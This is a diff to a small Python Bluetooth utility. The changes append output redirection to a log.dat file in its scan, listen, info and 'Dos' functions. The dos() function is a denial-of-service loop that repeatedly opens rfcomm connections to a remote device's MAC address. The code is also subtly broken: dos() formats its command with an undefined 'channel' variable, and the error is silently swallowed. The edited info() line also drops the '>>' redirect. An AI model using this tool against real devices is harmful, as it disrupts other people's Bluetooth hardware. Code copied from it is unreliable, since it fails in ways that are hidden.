@@ -27,21 +27,21 @@ def opt(): # options code
    else:
        sys.exit()
 def scan(): # listen code
-    os.system("hcitool scan")
+    os.system("hcitool scan >> log.dat")
 def dos(): # Dos code
     mac = input("remote mac --> ")
     port = input("channel --> ")
     try:
         while True:
-            os.system("rfcomm connect {} {}".format(mac , channel))
+            os.system("rfcomm connect {} {} >> log.dat".format(mac , channel))
     except Exception:
         pass
 def listen():
     port = input("channel --> ")
-    os.system("rfcomm listen {}".format(port))
+    os.system("rfcomm listen {} >> log.dat".format(port))
 def info():
     mac = input("remote mac --> ")
-    os.system("rfcomm show {}".format(mac))
+    os.system("rfcomm show {} log.dat".format(mac))
 time.sleep(0.5)
 banner()
 while True:
